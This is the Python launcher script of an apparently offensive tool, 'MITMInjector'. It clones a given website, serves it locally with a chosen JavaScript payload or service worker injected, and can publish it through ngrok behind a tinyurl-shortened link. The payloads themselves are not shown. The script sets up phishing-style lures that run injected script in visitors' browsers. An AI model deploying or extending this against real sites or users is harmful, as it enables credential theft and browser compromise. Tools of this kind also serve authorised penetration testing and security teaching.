#!/usr/bin/python3

import os
import argparse

from core.ngrok import ngrok
import core.httpserver
import core.urlshortner


def main(args):
	if (args.payload is None) and (args.worker is None):
		print ("Required Payload (-P) or Service Worker (-S)!")
		return
	else:
		if args.payload is not None:
			if not (os.path.exists("payloads/" + args.payload + ".js")):
				print ("Payload \"%s\" not exists" % args.payload)
				return
		if args.worker is not None:
			print ("Check worker")
			if not (os.path.exists("workers/" + args.worker + ".js")):
				print ("Worker \"%s\" not exists" % args.worker)
				return

	#start ngrok
	lngrok = ""
	if args.ngrok:
		if (os.path.exists("ngroktoken")):
			authtoken = open("ngroktoken",'r').read().strip()
			lngrok = ngrok(authtoken, str(args.port))
			NgrokURL = lngrok.start()
			print ("Public URL: " + NgrokURL)
			if (args.shortner):
				print ("Short URL: " + core.urlshortner.tinyUrl(NgrokURL))
		else:
			print ("ERROR: ngrok auth token not found! Please get your token from https://dashboard.ngrok.com/auth and save it into a file named ngroktoken.")
			return
	ON_HEROKU = os.environ.get('ON_HEROKU')
	port = 8080
	if ON_HEROKU:
		port = int(os.environ.get('PORT', 17995))
	else:
		port = int(args.port)
	core.httpserver.startServer(args.url, port, args.payload, args.worker)

	if args.ngrok:
		lngrok.stop()
		print ('ngrok process killed.')


if __name__ == '__main__':
	version = "1.1.0"
	print( """
 __  __ ___ _____ __  __ ___        _           _             
|  \/  |_ _|_   _|  \/  |_ _|_ __  (_) ___  ___| |_ ___  _ __ 
| |\/| || |  | | | |\/| || || '_ \ | |/ _ \/ __| __/ _ \| '__|
| |  | || |  | | | |  | || || | | || |  __/ (__| || (_) | |   
|_|  |_|___| |_| |_|  |_|___|_| |_|/ |\___|\___|\__\___/|_|   
                                 |__/     

	Andrea Fortuna - andrea@andreafortuna.org - https://www.andreafortuna.org
	""" )

	parser = argparse.ArgumentParser()
	parser.add_argument("-u", "--url", required=True, help="Website to clone")
	parser.add_argument("-p", "--port", required=False, help="Local server port (default:8080)", default=8080)
	parser.add_argument("-P", "--payload", required=False, help="Payload")
	parser.add_argument("-W", "--worker", required=False, help="Web worker [EXPERIMENTAL]")
	parser.add_argument("-n", "--ngrok", required=False, action='store_true', help="Export server with ngrok.com")
	parser.add_argument("-s", "--shortner", required=False, action='store_true', help="Mask ngrok.com url with tinyurl")

	args, leftovers = parser.parse_known_args()
	main(args)











